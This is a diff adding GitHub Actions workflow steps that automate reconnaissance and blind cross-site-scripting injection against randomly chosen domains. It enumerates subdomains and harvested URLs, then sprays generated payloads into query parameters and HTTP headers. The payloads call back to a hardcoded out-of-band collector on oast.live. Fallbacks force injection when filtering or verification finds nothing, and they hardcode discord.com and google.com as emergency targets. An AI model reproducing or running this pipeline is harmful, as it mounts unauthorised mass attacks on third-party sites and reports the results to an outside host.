@@ -1,0 +1,92 @@
+- name: Active & Passive URL Collection
+        shell: bash
+        env:
+          TARGET_COUNT: ${{ github.event.inputs.target_count || '2' }}
+        run: |
+          set -euo pipefail
+          # Initialize all files as empty but existing
+          touch tmp/subs.txt tmp/raw_urls.txt tmp/filtered.txt tmp/final_targets.txt
+          
+          grep -v "^#" targets.txt | grep -v "^$" | shuf -n "$TARGET_COUNT" > tmp/active_targets.txt
+          
+          while IFS= read -r domain; do
+            domain=$(echo "$domain" | tr -d '[:space:]' | tr '[:upper:]' '[:lower:]')
+            echo "🎯 Target: $domain"
+            
+            # Subdomain discovery
+            subfinder -d "$domain" -silent >> tmp/subs.txt || echo "$domain" >> tmp/subs.txt
+            
+            # Crawl Apex + Top 2 subs
+            (echo "$domain"; head -n 2 tmp/subs.txt) | sort -u | while read -r sub; do
+               echo "  ∟ Crawling: $sub"
+               (timeout 40s waybackurls "$sub" 2>/dev/null || true) >> tmp/raw_urls.txt
+               (timeout 40s gau "$sub" --threads 5 --blacklist jpg,png,gif,css --subs 2>/dev/null || true) >> tmp/raw_urls.txt
+               (timeout 60s katana -u "$sub" -silent -nc -jc -kf all -d 2 || true) >> tmp/raw_urls.txt
+            done
+          done < tmp/active_targets.txt
+          
+          # SAFETY: If raw_urls is empty, use active_targets as the raw list
+          if [[ ! -s tmp/raw_urls.txt ]]; then
+            echo "⚠️ Crawl returned nothing. Using domains as raw URLs."
+            cat tmp/active_targets.txt | sed 's|^|https://|' > tmp/raw_urls.txt
+          fi
+
+          # Filtering Step
+          cat tmp/raw_urls.txt | uro | grep "=" > tmp/filtered.txt || true
+          
+          # FALLBACK 1: If uro/grep deleted everything, just use raw_urls with a forced parameter
+          if [[ ! -s tmp/filtered.txt ]]; then
+             echo "⚠️ Filtering wiped results. Forcing parameters on raw URLs..."
+             cat tmp/raw_urls.txt | sort -u | head -n 50 | sed 's/$/?debug=true\&q=bxss/' > tmp/filtered.txt
+          fi
+          echo "URL_FILTERED=$(wc -l < tmp/filtered.txt)" >> $GITHUB_ENV
+
+      - name: Resilient Live Verification
+        run: |
+          # Ensure filtered.txt exists and has content
+          [[ ! -s tmp/filtered.txt ]] && echo "https://google.com?q=fallback" > tmp/filtered.txt
+          
+          # Try to verify, but store in temp file
+          cat tmp/filtered.txt | httpx -silent -timeout 10 -threads 20 -follow-redirects -no-color > tmp/verified_temp.txt || true
+          
+          # FALLBACK 2: If httpx finds 0 live hosts, IGNORE httpx and use filtered.txt
+          if [[ -s tmp/verified_temp.txt ]]; then
+            echo "✅ $(wc -l < tmp/verified_temp.txt) live URLs verified."
+            mv tmp/verified_temp.txt tmp/final_targets.txt
+          else
+            echo "⚠️ Verification failed/blocked. Using original filtered list as fallback."
+            cp tmp/filtered.txt tmp/final_targets.txt
+          fi
+          echo "URLS_SELECTED=$(wc -l < tmp/final_targets.txt)" >> $GITHUB_ENV
+
+      - name: Injection Phase
+        shell: bash
+        env:
+          OAST_URL: ${{ secrets.OAST_URL || 'd51hku5a9dbj8v34kungg3phr1jdxfm8w.oast.live' }}
+        run: |
+          # 1. Final Safety Check
+          if [[ ! -s tmp/final_targets.txt ]]; then
+             echo "🚨 CRITICAL: No targets found even after fallbacks. Creating emergency target."
+             echo "https://discord.com/?debug=true" > tmp/final_targets.txt
+          fi
+
+          python3 generate_payloads.py "$OAST_URL" tmp/payloads.txt || echo "alert(1)" > tmp/payloads.txt
+          
+          mapfile -t PAYLOADS < tmp/payloads.txt
+          success_count=0
+          
+          for i in "${!PAYLOADS[@]}"; do
+            payload="${PAYLOADS[$i]}"
+            echo "💉 Injecting Variant $((i+1)) into $(wc -l < tmp/final_targets.txt) URLs"
+            
+            count=$(cat tmp/final_targets.txt | qsreplace "$payload" | xargs -I {} -P 10 \
+              curl -sk -L -m 10 -w "%{http_code}\n" -o /dev/null \
+              -H "User-Agent: $payload" \
+              -H "X-Forwarded-For: $payload" \
+              "{}" | grep -cE "^(200|302|403|404)" || echo 0)
+            
+            success_count=$((success_count + count))
+          done
+          
+          echo "INJECTIONS_SUCCESS=$success_count" >> $GITHUB_ENV
+          echo "PAYLOAD_COUNT=${#PAYLOADS[@]}" >> $GITHUB_ENV
